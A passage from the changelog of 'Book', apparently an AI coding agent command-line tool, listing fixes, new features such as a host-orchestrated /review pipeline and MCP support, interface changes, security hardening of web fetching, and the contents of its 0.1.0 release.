  recoverable. Previously the report showed zero findings and a `clean` verdict with no indication
  anything had been dropped.
- `/review` deduplication once again collapses the same defect reported by more than one reviewer.
  Findings are bucketed by category/file/line, then compared by summary similarity, so two lenses
  describing one defect in different words collapse to a single finding while two genuinely
  different defects on the same line stay separate. Deduplication had become sensitive to exact
  wording, which meant cross-reviewer duplicates — the case `--deep` produces most — survived into
  the report. The wording-sensitive key remains in use for the evaluation harness, where matching a
  specific finding is the point.
- A user or project agent definition named `reviewer` is no longer discarded without a word. The
  built-in `reviewer` remains a trust boundary — a same-named definition still cannot replace its
  role, tools, isolation, or body — but the suppression is now recorded and reported by
  `book doctor`, naming the layer the ignored definition came from and pointing at
  `agents.profiles.reviewer` for the model/effort tuning that does apply.
- The CLI now defaults `NODE_ENV` to `production` before React loads, so the TUI renders with
  production React instead of the 2-3x slower development build (an explicitly set `NODE_ENV`
  still wins). `npm run bench:ui` measures production mode to match. Combined with new render-path
  caching — a revision-stable transcript viewport snapshot, per-message row-estimate reuse in the
  virtualized transcript, a stable streaming timeline identity, memoized layout-revision hashing,
  and fast paths in `displayWidth` — long-transcript streaming updates and unrelated managed-trace
  updates render 3-4x faster and back inside their latency budgets.
- Background shells and long-running Bash commands no longer make the TUI sluggish. Shell output
  events are coalesced to a 250ms refresh and the shell list bails out when nothing it renders has
  changed, so raw stdout/stderr chunk frequency no longer drives full App re-renders and Yoga
  layout passes. The shell detail view reads its output tail in a polling effect instead of doing
  synchronous file I/O inside App's render. Running tool rows tick their elapsed time once per
  second (previously 10x/s) with second granularity, and stop ticking entirely under reduced
  motion. Large tool-output previews measure bytes with one call over the whole output instead of
  allocating a Buffer measurement per line, and the markdown sniff over expanded output is
  memoized.
- Managed children now publish and review evidence through their owning agent manager instead of
  being rejected as owned by another live Book process.
- Provider-emitted `parent:`, `default:`, and `tool:` wrappers resolve to an existing registered
  tool, and `glob_files` resolves to `Glob`; unrelated namespaced commands remain rejected.
- Vitest runs no longer append synthetic tool calls to the user-global `book tool-stats` history.
- Windows now defaults to the full-frame TUI renderer so deep transcript scrolling cannot corrupt
  or erase the fixed input and status footer. Incremental rendering remains available through an
  explicit `BOOK_TUI_RENDERER=incremental` override.
- Mouse-wheel scrolling now reaches conversation history when the Windows CLI runs from WSL,
  instead of being translated into Up/Down prompt-history navigation by the outer terminal.
- Stopping a background job on Linux and macOS no longer records `killed` while the job's processes
  keep running. Background commands run through `sh -c`, which forks the real worker, so the shell
  wrapper dies from SIGTERM even when the worker ignores it — and both the persistent job runner
  and the session-lifetime shell manager read that wrapper's exit as proof the tree had gone, so
  they never escalated to SIGKILL. Termination now escalates and reports success based on whether
  the job's process group still holds a process, so an orphaned worker can no longer keep ports,
  file handles, and CPU behind a terminal `killed` record. Windows already terminated the tree
  through `taskkill /T /F` and is unchanged.
- **Print/headless plan mode no longer auto-rejects the plan it asked for.**
  `book -p --permission-mode plan …` rejected every `ExitPlanMode` call unconditionally, so the
  model revised and resubmitted until `--max-turns` was gone and the run ended `failed`/`max_turns`
  with nothing to show for it. A host that supplies `onUserQuestionRequired` now decides the plan
  through that same handler — one question, `Approve` / `Reject`, with any other free-text answer
  taken as revision feedback — and `bypassPermissions` still approves automatically. A host with no
  handler cannot approve anything, so the run stops at the first plan and returns the plan as its
  deliverable: `text` prints the plan followed by an explicit "no changes were applied" line,
  `json` and `stream-json` add
  `plan: {status: "not_applied", reason, plan, message}`, the outcome is
  `completed`/`normal_completion`, and the process exits 0 — "finished and deliberately changed
  nothing" is expressed by `plan.status`, not by an exit code. The `plan_approval` stream event's
  `status` is now one of `approve`, `approve-fresh`, `reject`, `revise`, or `stop`.

### Added

- **A BYOK provider's model list can be filled in by hand, and an existing one can be updated
  without re-adding the provider.** The add-provider wizard used to fire model discovery the
  instant the API key was submitted, so an endpoint with no model-list API could only be
  configured by failing discovery first and taking the error screen's fallback. It now asks where
  the list should come from — discover automatically, or type the model IDs (comma-separate for
  several) — before any request is made; the post-failure fallback remains. For a provider that is
  already configured, selecting one of its models in `/model` or `/providers` exposes `Alt+R` to
  re-read the catalog from the endpoint and `Alt+M` to add model IDs by hand, both announced on the
  row itself and neither changing the active model or the stored credentials. Both follow the same
  ownership rule as `Alt+D` — only providers you added, since a catalog edit is written to
  `~/.book/settings.json` and applying one to a provider inherited from a project layer would copy
  that provider's credential into a second file and make the inherited copy look removable.
  - A refresh replaces what discovery previously returned, but **hand-entered models survive it**.
    They are recorded as `"manual": true` under `provider.<id>.models.<model>` for exactly this
    reason: they exist because the endpoint does not list them, so a refresh that dropped them
    would undo the user's work every time. The marker is cleared once discovery starts returning
    that id on its own.
  - Adding models to an existing provider no longer rewrites its `baseURL` and `apiKey` with the
    values the caller happened to carry. Previously `providerConfigFromDraft` always wrote both,
    which also meant a provider configured with the legacy lowercase `baseUrl` key failed schema
    validation on refresh instead of saving. Writing a `baseURL` now retires any legacy `baseUrl`
    beside it, which would otherwise linger in `settings.json` as a stale value that reads as live.
  - An endpoint that returns an empty list is reported on both paths. A refresh used to throw while
    picking an active model out of the empty result; the wizard used to drop the user on an empty
    "Choose models" screen that answered `Enter` with "Select at least one model." and offered no
    way forward.
  - The highlighted model no longer slides out from under the cursor when a catalog changes.
    Model ids are sorted, so a refresh or a manual add re-orders the list and the highlight used to
    stay on an index rather than a model — `Enter` could then save a neighbouring model as the
    default. The selection is re-anchored on the id it was on.
- **Slash commands work in print/headless mode.** `book -p /security-review`, `book -p /init`, and
  any `.book/commands/*.md` command now resolve through the same registries, the same
  `$1..$9` / named-argument / `${BOOK_*}` / shell substitution, and the same `allowed-tools` and
  `model` frontmatter enforcement as the TUI, instead of being handed to the model as literal text.
  Commands that need an interactive surface — session controls, pickers, panels, `/config`,
  `/export`, `/memory` — are refused _before_ their own code runs, so none of their side effects can
  half-fire in a host that could not show the result; the error lists what is supported and the run
  exits 1. A `/name` that is not a command at all is still forwarded verbatim, so an ordinary prompt
  beginning with a path is unaffected. A command the host performed itself is reported as a
  `command_result` stream-json event and as `result.commandResults` in every output format,
  including the SDK. `expandSlashCommands: false` on `HeadlessOptions` forwards every prompt
  verbatim, for hosts relaying untrusted end-user text.
- **`/review` runs outside the TUI.** `book -p /review`, `--deep`, `--base <ref>`, path scopes, and
  `<base>...<head>` all execute the same host-orchestrated pipeline — the host still resolves the
  review target and the reviewers still receive an immutable diff and no diff tool — and emit a
  stable machine report under `--output-format json` / `stream-json`: `verdict`, `target`,
  `findings` as `ReviewFinding` values verbatim, and the pipeline's own `coverage`, with the
  unified diff deliberately omitted. The sequencing that used to live in `src/tui/app.tsx` moved
  into `src/review/host.ts`, so the two hosts cannot drift apart. `--fix` stays interactive-only: a
  non-interactive host cannot approve a patcher's tool calls, so it is refused with an explanation
  instead of editing and committing unattended. A review that could not run — a bad ref,
  `agents.mode = off`, an unknown option — exits 1; an inconclusive _verdict_ does not, because the
  review ran.

- A `Maintenance` CI workflow (`.github/workflows/maintenance.yml`) that runs the deterministic half
  of the nightly maintenance work: a knip dead-code report on every pull request and on a daily
  schedule, and a scheduled `npm audit` that keeps a single rolling `Dependency security advisories`
  issue in sync. The dead-code scan now reads a committed `knip.json` and a pinned `knip`
  devDependency instead of an ad-hoc config and an unpinned `npx knip@6`, so its results are
  reproducible between runs. New scripts: `deadcode:check`, `deadcode:report`, `deadcode:json`.
- The harness run evidence ledger writes through a durability backend seam, and a SQLite backend
  (`node:sqlite`, WAL with `synchronous = FULL`) joins the existing append-only JSONL writer. The
  JSONL writer cannot prove durability — Node exposes no portable directory fsync — so its seals
  always reported `directorySync: unavailable` and every run stayed
  `evidenceEligibility: ineligible`, which no host could ever satisfy. The SQLite backend commits
  records and the seal as transactions and seals as `eligible`. Record framing, the monotonic
  sequence, and the SHA-256 hash chain are byte-identical across backends, so a stream verifies the
  same way regardless of which wrote it, and a backend that cannot prove a guarantee still fails
  closed — the SQLite backend reads its `journal_mode` and `synchronous` pragmas back and reports
  `unavailable` when the filesystem refused WAL, rather than trusting the request. The seal now also
  records which backend made the claim. JSONL remains the default and the SQLite backend is not yet
  selectable through settings, so this changes what the ledger _can_ attest, not yet what it does.
- Experimental execution workflows for the observe-mode harness. `harness.workflow` (settings) and
  `--harness-workflow <id>` (run-scoped) select one of three validated built-ins — `minimal`,
  `safe-edit`, and `verify-heavy` — from a hashed registry. `minimal` renders no prompt text and
  leaves provider messages byte-identical to a run with no harness. Workflows are bounded guidance
  only: permissions, sandboxing, budgets, retries, compaction, checkpoint/resume, and tool contracts
  remain host-owned, unsupported requests are clamped and recorded as `capability_clamped` evidence,
  and a definition's free-form description is never rendered as an instruction. Every run records the
  requested and effective workflow, source, reason, registry/definition digests, override scope, and
  declared complexity. Selection fails closed — a workflow chosen while `harness.mode` is `off`, an
  unknown ID, or a path-like ID is rejected by `book config set` and at startup rather than silently
  ignored. Project-defined workflow files are not loaded.
- MCP servers can now prompt the user mid-tool-call through form elicitation. The TUI renders the
  requested fields — text, number, yes/no, and filterable choice lists — labelled with the server
  that asked, and returns the answer inside the open call; declining or cancelling answers the
  server instead of leaving it waiting. The elicitation capability is declared only when a host can
  actually prompt, so headless and SDK runs (unless they pass `onElicit`) leave servers to fail such
  requests themselves rather than block. Answers are validated against the requested schema before
  they are sent, and requests Book cannot render faithfully — URL mode, or schemas outside the
  protocol's primitive subset — are declined.
- MCP now uses the official protocol SDK and works in the interactive TUI as well as print and SDK
  runs. It supports stdio, Streamable HTTP, and legacy SSE servers; content blocks, structured
  errors, cancellation, pagination, negotiated metadata, dynamic `tools/list_changed` refresh,
  bounded diagnostics, and graceful remote-session termination. Project `.mcp.json` servers require
  fingerprinted one-time approval, while `/mcp`, `book mcp list|get|add|remove`, `book doctor`, and
  server-scoped permission rules (`mcp__server`) expose and control the resulting surface without
  printing header or environment secrets.
- `harness.mode: observe` now records an append-only run-evidence ledger without changing run
  behavior. Every root user request gets one canonical JSONL stream under
  `BOOK_HOME/projects/<workspace-id>/harness/v1/runs/`, written by a single writer with canonical
  JSON records, a SHA-256 previous-record hash chain, and a signed terminal seal that reports
  durability, drop/error counters, and fail-closed evidence eligibility. Persisted events pass an
  allowlist redaction policy (no prompts, tool arguments or output, file paths, commands, URLs, or
  secrets); turn, tool, usage, retry, stall, permission, and managed-agent handoff facts are
  captured as bounded scalars with OpenTelemetry-mapped names pinned to Semantic Conventions
  v1.44.0. Headless multi-turn runs defer each root seal until linked continuation turns finish;
  managed continuations join the originating root stream as explicit child runs. Retention cleanup
  honors evidence pins, truncated or tampered streams read as inspectable-but-incomplete, and
  `off` remains the inert default with no filesystem effect.
- `/review` is now a host-orchestrated pipeline instead of an ordinary agent prompt. Book resolves
  the change once into an immutable review target (base commit, changed files, and a unified diff
  including untracked files) and hands it to read-only `reviewer` agents, so a review cannot widen
  its own scope or drift onto unrelated changes. New flags: `--base <ref>`, `--deep`, `--fix`, plus
  a path or `<base>...<head>` range argument. `--deep` fans out four specialized lenses
  (correctness, security, simplification, efficiency), deduplicates and confidence-filters their
  findings, then runs an independent falsification pass that must return one verdict per candidate.
  Coverage is explicit: a failed, timed-out, or unstructured pass caps the verdict at
  `inconclusive` rather than reporting a clean review, and output that fails the JSON contract is
  preserved verbatim instead of discarded. `--fix` applies only verified findings through the
  patcher → validator evidence pipeline, where a distinct validator must approve the exact patch
  candidate.
- A `REVIEW.md` at the workspace root calibrates reviews for the repository. It is injected as
  calibration only and cannot change the output contract, disable verification, or broaden reviewer
  tools.
- New built-in `reviewer` managed-agent profile (read-only, no diff tool) backing `/review`. It is a
  trust boundary: a project agent definition of the same name cannot replace its role, tools,
  isolation, or body.
- `npm run eval:review -- <fixtures.json>` scores review output against a golden set — precision,
  recall, F1, usefulness rate, and signal-to-noise ratio — from reports captured on real runs. See
  `evals/review/fixtures.example.json`.
- New empty startup sessions now open with an optional full-screen magical fire sequence that
  burns into the Book welcome. It is deterministic, skippable with Esc or typing, automatically
  bypassed for reduced-motion and screen-reader modes, and configurable through `/config` or
  `ui.startupAnimation`.
- Adaptive-harness evaluations now have a reusable external-process runner that provisions fresh
  workspace, `BOOK_HOME`, user-config, cache, and temporary directories; copies only explicitly
  allowlisted ambient variables; bounds captured output; and distinguishes failure, timeout,
  cancellation, and spawn errors. Timeout and cancellation terminate the evaluator process tree
  with bounded graceful and forced teardown. This is a reproducibility boundary for trusted
  built-in fixtures, not a security sandbox for project-controlled commands. `npm run eval:edit`
  now runs every trial through this boundary with managed agents disabled and generated isolated
  settings that preserve the resolved provider-facing model ID, model metadata, retry policy, and
  whether output-token and reasoning-effort options were explicitly configured. The provider-backed
  `npm run eval:compact` benchmark now uses the same isolated settings and secret references, and
  `npm run eval:skills` parses its observation corpus in a bounded disposable worker. Ambient run
  snapshots now use schema version 2 to identify isolated evaluation Book-home contents with a
  bounded secret-safe digest while normalizing evaluator-owned temporary paths and run IDs. The
  same snapshot now fingerprints effective command and skill registries from content digests
  without retaining command or skill bodies. The runner now owns and reports prompt date, random
  seed, exact dirty/untracked runtime revision, and materialized-fixture revision. Provider-backed
  edit and compaction evaluations fail closed unless terminal, ambient, accounting, usage, pricing,
  model identity, Book-home isolation, and single-agent run-boundary evidence are eligible;
  paired compact comparisons also reject mismatched ambient, pricing, budget, or resolved-model
  identities; compact reports use schema version 3 and evaluator workers reject stale or malformed
  report shapes;
  compaction includes reducer calls and treats retried or usage-less attempts as partial evidence.
  Offline skill-observation reports explicitly mark provider-run eligibility as not applicable while
  retaining the same runner controls. These changes make Tier A/B ready for trusted built-in Phase 0
  work without admitting Tier C project-controlled or adversarial execution.
- Architecture checks now keep offline harness evaluation code out of the live agent runtime,
  prevent evaluators from importing live execution modules, and keep permission/sandbox kernel
  modules independent from harness policy.
- `BOOK_HOME` can now relocate Book's user-global state from `~/.book`, including settings,
  sessions, memory, managed-agent state, jobs, rewind snapshots, telemetry, tool output, MCP
  configuration, and user-level discovery. Project-local `.book/` state remains unchanged.
- `/skills` now opens a keyboard-driven skill manager with Codex/Claude Code-inspired
  visibility controls (`auto`, `name-only`, `manual`, and `off`), explicit-use handoff,
  scope/path details, reload support, and a matching entry in `/config`.
- Skills now use metadata-first `SKILL.md` discovery with portable `.agents/skills` compatibility,
  `.claude/skills` and OpenCode roots, lazy bodies/resources, scoped tool intersections, consent
  policies, lifecycle diagnostics, and debounced safe-boundary reloads. Existing `.book/skills`
  packages continue to work; third-party skills can be migrated by placing the same package under
  `.agents/skills/<name>/`. `/skills status` provides a body-free runtime report with catalog and
  prompt-omission diagnostics, active frames, effective tools, validation failures, and recent
  lifecycle outcomes. Conflicting skill restrictions now fail visibly instead of activating an
  empty tool surface, resource reads verify content digests against post-discovery substitution,
  and `npm run eval:skills` gates implicit rollout using privacy-safe activation metrics. Newly
  discovered skills default to explicit/manual use until that evaluation supports enabling `auto`.

- Unified `/jobs` TUI management for managed agents and background shell jobs, with `/tasks` kept
  as an alias. Background shells support session or explicit persistent lifetimes, bounded output,
  optional parent-agent completion delivery, restart reattachment, stop/dismiss controls, and SDK/
  stream-json lifecycle events. Finished and stopped shell rows leave the active UI automatically
  while a one-time completion notice remains available.

- Streaming assistant responses now use the same Markdown layout as completed replies while
  keeping a bounded, throttled live tail for responsive rendering of large outputs.

- `/config` now opens a visual settings menu for model, effort, theme, memory capture, and
  subagent profile models. Explorer, patcher, validator, and custom profiles can select an
  existing configured model or reset to parent-model inheritance without editing JSON.

- `AskUserQuestion` now explicitly advertises single- and multi-select questions to models.

- Added terminal-screen regression coverage and made patched Ink incremental rendering the default
  interactive mode through `BOOK_TUI_RENDERER`. The stable full-frame renderer remains available
  as `BOOK_TUI_RENDERER=safe`, while active TUI animations share pausable clocks to reduce render
  churn.

- Persistent tool-use telemetry and a `book tool-stats` subcommand for measuring tool use across
  sessions. Each finalized tool call appends one JSON line to `~/.book/telemetry/tool-use.jsonl`
  (best-effort, off the hot path, size-rotated; captured at the final-status point so plan/user
  mutations are reflected), recording the tool, status, a derived `isFailure` flag (only `error`/
  `timed_out` — blocks/cancellations never count), error code, duration, retries, model, and
  subagent attribution. `book tool-stats` reports per-tool calls/fail rate/p50/p95/retry rate, a
  per-model split, and top error codes (`--json`, `--since <days>`, `--all`, `--prune`). Gated by
  `observability.toolTelemetry` (default on) with `observability.toolTelemetryRetentionDays` as the
  reporting/prune window. Separate from the ephemeral in-session counters in `/usage`.

- Fresh-context plan handoff: an "Approve, fresh context" option (shortcut `F`) at the plan-approval
  prompt stops the planning turn and starts a new conversation seeded with only the approved plan —
  the implementation runs with a clean context window, like Codex/Claude Code handoff.
- Model-conditional mutation guidance: the system prompt recommends `ApplyPatch` to GPT/Codex-family
  models (known picker models resolve by provider metadata) and exact-replace `Edit`/`MultiEdit` to
  everything else, with a per-model `editFormat` (`patch` | `replace` | `whole`) settings override
  under `provider.<name>.models.<id>`. In plan mode the guidance instead directs the model to
  explore read-only and call `ExitPlanMode`.
- Cross-harness tool-argument aliases, declared on each tool definition: Claude Code-style
  spellings (`file_path`, `old_string`, `new_string`, `replace_all`, nested MultiEdit `edits[]`
  keys, Grep `glob`/`-A`/`-B`/`-C`, ApplyPatch `input`) normalize to canonical arguments before
  hook and permission evaluation — aliased spellings cannot bypass path-scoped permission rules —
  and `invalid_arguments` errors list the allowed argument names.
- Grep `path` (directory or file scope) and `C` (symmetric context) parameters on both the native
  `rg` and portable backends; scoped portable searches still honor root-anchored `.gitignore`
  patterns.
- Whitespace-tolerant Edit/MultiEdit recovery: trailing-whitespace and uniform-indent-shift
  relaxations apply only on a unique match, re-indent the replacement (rejecting matches whose
  replacement cannot shift consistently), annotate the result, never apply to `replaceAll`, and
  yield to the event loop with abort support on large files.
- An advisory identical-retry circuit breaker that appends escalated guidance to the tool's own
  remediation when a call repeats with the same arguments and error (retryable transient failures
  exempt), plus structured remediation now rendered into model-facing error text as `Fix:` lines —
  preserved even when oversized errors are clipped.
- Per-session tool call/failure counters surfaced in `/usage` (text report and TUI card, with
  totals and failing tools listed first). Only real errors and timeouts count as failures; user
  denials, plan-mode blocks, and cancellations do not.
- `npm run eval:edit` — a deterministic edit-reliability eval (~25 fixture tasks) run against the
  configured model via the SDK, reporting per-task results to `.book/reports/`.
- Bounded, session-wide concurrent execution for explicitly reviewed read-only file and Git tools,
  with ordered serial barriers, all-settled sibling results, duplicate-call rejection, and shared
  root/managed-child scheduling.
- Codex-style `AGENTS.md` project-instruction discovery alongside the existing Claude-style
  `CLAUDE.md` and `.claude/rules` loader.
- Resilient managed-agent persistence with fsynced atomic writes, bounded Windows contention
  retries, per-target locks, process leases, orphan-temp recovery, background coalescing, typed
  retryable tool failures, and non-modal degraded/recovered storage events.
- A clear 30-day local retention policy for expired sessions and rotated debug logs; the active
  session and current debug log are always preserved.
- Canonical `ApplyPatch` file mutation with exact contextual hunks, LF/CRLF and BOM preservation,
  multi-file staging, atomic verification, rollback, per-file artifacts, legacy permission/hook
  compatibility, and the `apply_patch` provider alias.
- Native `rg` streaming for `Grep`, bounded `WebFetch`/`WebSearch` responses, rotating debug logs, terminal-shell TTL/cap cleanup, and the explicit `DismissShell` action.
- Claude Code-style queued follow-up input: Enter queues while a turn is running, Up recalls the newest queued message, Enter resubmits edits, and Esc cancels queue editing without interrupting the active turn.
- Repeatable `bench:runtime` coverage for snapshots, sessions, search, Grep, context construction, streaming updates, and retained resources.
- Managed-agent hardening with an outstanding spawn cap, paginated `AgentRead` result recovery, context-budgeted and idempotent completion delivery, bounded retries, per-record version-3 persistence, managed Git artifact cleanup, and per-run telemetry generations.
- Claude-style managed-agent contracts: purpose-named runs distinct from reusable profiles, durable automatic parent completion delivery, semantic lifecycle rows, a prompt-adjacent `/tasks` panel, resumable child transcripts, version-2 state migration, profile model resolution, compact lifecycle projections, advisory three-query Explore routing, actionable permission errors, multi-host runtime events, read-only non-Git Explore, and explicit third-party agent import previews.
- Claude-style inline managed-agent activity blocks: live child tool calls in the main transcript, compact `+N tool uses` overflow, bounded realtime result previews, and full-history child detail navigation.
- Provider-neutral `ToolSearch` with adaptive eager/deferred exposure, fuzzy catalog metadata, next-turn activation, MCP namespace discovery, and session-scoped LRU retention.
- A breaking ToolResult V2 contract for provider content, machine-readable data, actionable errors, metrics, artifacts, pagination, and TUI presentation. Persisted pre-V2 session results are upgraded while loading.
- Adaptive managed agents with built-in explorer/patcher/validator profiles, three-worker scheduling, resumable persisted transcripts, background lifecycle controls, and TUI/SDK/headless interfaces.
- Synthetic Git snapshots and per-agent worktrees that preserve dirty parent state, automatically commit patcher deltas, and atomically reject drift or conflicts.
- Typed evidence publishing and independent validator verdicts; `AgentApply` accepts only the exact candidate commit linked to a pass verdict.
- Named `Check` commands from `agents.checks` or standard package scripts, plus local paired evaluation metrics for `--agents off` versus `--agents adaptive`.
- Structured `AskUserQuestion` clarification flow with a step-by-step TUI wizard, free-text answers, SDK callbacks, stream-json observability, and root/subagent source attribution.
- Claude Code-style `/effort` command with direct level selection, a dedicated keyboard picker, model capability restrictions, and project-local default persistence.
- Reference-aware compact checkpoints retain a token-budgeted exact recent tail, grounded historical constraints, task episodes, and freshness-checked file observations.
- Bounded `SessionHistorySearch` / `SessionHistoryRead` tools recover compacted-away evidence through stable current-session references.
- Claude-style `/rewind` with a two-stage prompt/action picker, append-only conversation branching, content-addressed workspace checkpoints, Git HEAD drift protection, transactional rollback, and temporary storage under `--no-session-persistence`.

### Changed

- Detailed tool rows now keep raw call parameter lists out of both visual and screen-reader
  transcripts while retaining concise summaries and result output.
- Documentation now reflects the current proprietary/source-distributed package status, shipped
  CLI and runtime surfaces, open security boundaries, and implementation status of historical
  roadmap documents.
- `WebFetch` now returns structured provenance and Markdown/text/sanitized-HTML formats, uses a
  real HTML parser, preserves bounded complete output through the shared tool-output path, rejects
  binary content, and treats its legacy `prompt` argument as metadata instead of claiming to
  perform extraction. `WebSearch` now works without configuration through a built-in Exa MCP
  provider with a fixed endpoint, bounded responses, and result/domain/recency/country controls.
- Web tools are explicitly parallel-safe but remain permission-gated network operations, including
  in plan mode. Remembered fetch approval is scoped to the URL origin; cross-origin redirects must
  be fetched as a separately approved call.
- Improved TUI streaming responsiveness by batching first-turn updates at a sustainable cadence,
  avoiding idle accumulator wakeups, and limiting the active transcript window to the available
  terminal height while output is streaming. Live Markdown now uses a bounded plain-text tail and
  defers full decoration until completion.
- Smoothed mouse-wheel history navigation with three-row wheel steps, low-latency event-loop
  coalescing, isolated transcript content, and support for coalesced terminal reports.
- Reduced managed-agent render fan-out, bounded completed transcript hydration with keyboard/mouse
  history expansion, accelerated terminal-width measurement, and batched noisy render diagnostics.

- BYOK providers and the active model selection now persist to the user-global `~/.book/settings.json`
  instead of the per-project `.book/settings.local.json`, so a provider added in one folder (its
  credentials, model catalog, and default model) is shared across every project rather than
  re-entered per folder. Provider removal (`Alt+D` in `/model` / `/providers`) targets the global
  file, and removable rows are labeled `[BYOK]` (previously `[local BYOK]`). Saving a model or
  provider also clears any stale same-key override from the current folder's
  `.book/settings.local.json` (which would otherwise shadow the new global value), so an
  already-used folder picks up the global choice immediately. Existing per-project provider entries
  are still read via the layered resolver but are no longer managed from the picker.
- **Breaking:** `Edit`/`MultiEdit`/`NotebookEdit` — and `Write` over an existing file — now require
  the file to have been Read or `@`-mentioned in the session first (`file_not_observed`);
  previously only staleness after an observation was checked. `ApplyPatch` is exempt (context
  hunks self-anchor), contexts without an observation ledger are unaffected, observation keys are
  case-folded on Windows, and child agents inherit a copy of the parent's observations.
- `ApplyPatch` is no longer described as the universally preferred mutation tool; the preference is
  model-conditional (see Added) and tool descriptions are neutral.
- Tool concurrency is now an explicit policy rather than an idempotence side effect; preparation,
  hooks, permission prompts, interactive tools, mutations, shell commands, and lifecycle actions
  remain serial by default.
- Strengthened the stable agent system prompt with end-to-end persistence, evidence-first tool
  use, failed-call recovery, tighter scope control, behavior-level verification, final diff review,
  and explicit authorization scope.
- Session discovery now uses an atomic metadata index with linear JSONL replay and shared search/read indexes; rewind snapshots cache unchanged files, deduplicate manifest entry sets, and exclude workspace-local `.book/` state by default.
- Static prompt discovery, tool schema estimates, Git context, and streaming transcript projection are cached or incrementally updated, with adaptive flushing and a bounded streaming transcript window.
- Legacy permission migration runs during explicit startup, records a migration marker, skips identical settings writes, and serializes cross-process settings mutations.
- Replaced the separate Agent Center and profile tab with Claude Code's in-session task workflow: a flat `main`-plus-children panel below the prompt, empty-prompt Tab to cycle focus straight into each child's transcript (wrapping back to `main`), `/tasks` for explicit management, `x` to stop or dismiss, and Esc to return.
- New sessions receive a short title from their first prompt, and the TUI shows session names instead of internal UUIDs.
- Provider visibility, system-prompt tool summaries, command/skill capabilities, role restrictions, permission modes, runtime availability, and execution now share one resolved tool surface.
- Tool schemas are closed and centrally validated; model-visible sandbox bypass, backend selection, and generic timeout controls moved back to host configuration.
- Managed agents are enabled by default in adaptive mode; use `--agents manual` for explicit-only delegation or `--agents off` for the single-agent baseline.
- Agent definition tool lists are now strict capabilities: missing/empty denies all tools, `*` explicitly inherits, argument globs are enforced at execution, and user-question/MCP/lifecycle tools are never injected implicitly.
- Redesigned the interactive TUI with matched quiet-editorial dark/light themes, a compact BOOK bookplate, inset user cards, open assistant typography, tree-style tool activity, a floating rounded composer, and softer picker/approval surfaces.
- Compaction now replaces only active model context. The append-only transcript and chronological compact boundaries remain visible, scrollable, and resumable.
- `/context` reports visible transcript size separately from active provider context.

### Security

- Hardened `WebFetch` against SSRF and DNS rebinding by requiring HTTPS unless explicitly enabled,
  rejecting embedded credentials and local/private/special-use destinations, validating every DNS
  result again at connection time, manually bounding redirects, and refusing cross-origin redirect
  hops. Dangerous HTTP/private-network exceptions require explicit host environment opt-in.
- Managed snapshots include non-ignored untracked files in the local Git object database by default. Ignore secrets or set `agents.includeUntrackedInSnapshot` to `false` before delegation.
- Rewind snapshots intentionally include hidden, gitignored, and secret-like workspace files for complete local restoration, but keep file contents out of session JSON, logs, and model context; `.git` and workspace-local `.book/` state are excluded by default.

### Fixed

- Show a lightweight placeholder (or the live stream) instead of the main welcome screen when opening a child transcript that has not produced output yet.
- Queue concurrent permission requests instead of superseding earlier prompts, propagate
  cancellation into foreground shell processes, and give aborted tools a bounded cooperative
  teardown window before releasing their execution slot.
- Use a 64,000-token output fallback for models without published output metadata instead of consuming the entire fallback context window.
- Prevent context-window failures from oversized tool output by skipping binary `Grep` inputs, bounding search and generic tool results, preflighting complete provider requests, and compacting or clipping once before retrying recognized overflow errors.
- Apply interactive permission-mode changes immediately to the active agent loop.
- Keep mouse-wheel transcript scrolling while allowing terminal copy with Shift+drag.
- Reconcile transcript height after descendant-local updates so throttled Markdown remains reachable
  without restoring per-wheel full-content measurement.
- Deliver completed and failed subagent reports to the parent before automatically removing their terminal rows from the prompt-adjacent task panel.
- Prevent the first submitted TUI message from freezing during a cold rewind snapshot by yielding filesystem checkpoint work and rendering the optimistic turn first.
- Make `/theme` open a keyboard picker, apply the full app palette, persist the selection, resolve terminal auto mode correctly, and report invalid custom themes.
- Keep local slash-command output visible and resumable in the TUI without adding it to provider or compaction context.
- Add breathing room between transcript actions, keep general completed output collapsed, and show complete file-mutation diffs under Codex-style grouped file summaries with per-file collapse controls.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.1.0] - 2026-07-14

First public-ready release of Book, a provider-agnostic AI coding agent CLI with a Claude Code-style terminal UI.

### Added

#### Core agent

- Agent loop with multi-turn tool use, mid-stream abort (`Esc`), and context compaction (`/compact`)
- Anthropic Messages API provider (SSE streaming, prompt caching, adaptive thinking, `--effort`)
- OpenAI-compatible provider with auto-detect from `baseUrl`, retries, and usage tracking
- BYOK provider setup and model filtering in the TUI
- Two-zone system prompt (cacheable static prefix + dynamic per-turn suffix)
- Session persistence (JSONL) with `--resume`, `--continue`, `--session-id`, `--fork-session`
- Headless/print mode (`-p`) with `text` / `json` / `stream-json` output
- Structured output via `--json-schema`
- Optional stream-json enrichments: hook events, partial messages, prompt suggestions

#### Tools

- File tools: `Read`, `Write`, `Edit`, `MultiEdit`, `Glob`, `Grep`, `NotebookEdit`
- Shell: `Bash` with `run_in_background`, `BashOutput`, `KillShell`
- Git tools and unified diff rendering
- Web: `WebFetch`, `WebSearch`
- Task tools: `TaskCreate`, `TaskList`, `TaskGet`, `TaskUpdate`, `TaskStop`
- Plan mode: `EnterPlanMode`, `ExitPlanMode` with host approval gate
- Skills (`InvokeSkill`) and subagent `Task` delegation
- MCP client (stdio transport)

#### Project context & memory

- CLAUDE.md / rules tree walk (user → project → local → `.claude/rules`)
- Auto-memory store under `~/.book/projects/<project>/memory/` with approval inbox
- Secret detection before memory writes
- Skills, slash commands, and subagents discovered from `.book/`

#### TUI

- Ink/React interactive UI with welcome banner and status line
- Markdown rendering (tables, code, syntax highlighting)
- Transparent tool-call display; collapse long tool output; Claude-style edit summaries
- `@file` mentions with fuzzy autocomplete (Tab / Enter)
- Slash-command palette with fuzzy search and categories
- Permission prompts with six modes and persistent allow/deny rules
- Responsive layout, Static message handoff, scrollback stability work
- Model picker and BYOK provider setup flow
- Debug instrumentation via `BOOK_DEBUG*` flags

#### CLI & config

- Layered settings: `~/.book/settings.json` → `.book/settings.json` → `.book/settings.local.json` → `--settings`
- `book doctor` and `book config` subcommands
- Built-in slash commands including `/help`, `/model`, `/config`, `/permissions`, `/memory`, `/cost`, `/usage`, `/context`, `/diff`, `/export`, `/skills`, `/review`, `/security-review`, `/release-notes`, `/feedback`, `/init`
- Permission modes: default, acceptEdits, plan, auto, dontAsk, bypassPermissions
- Optional bubblewrap sandbox and lifecycle hooks (JSON-over-stdio)

#### SDK

- Programmatic `query()` generator export for embedding Book in other tools

### Notes

- npm package name `book` is already taken on the public registry; this release is distributed via GitHub only.
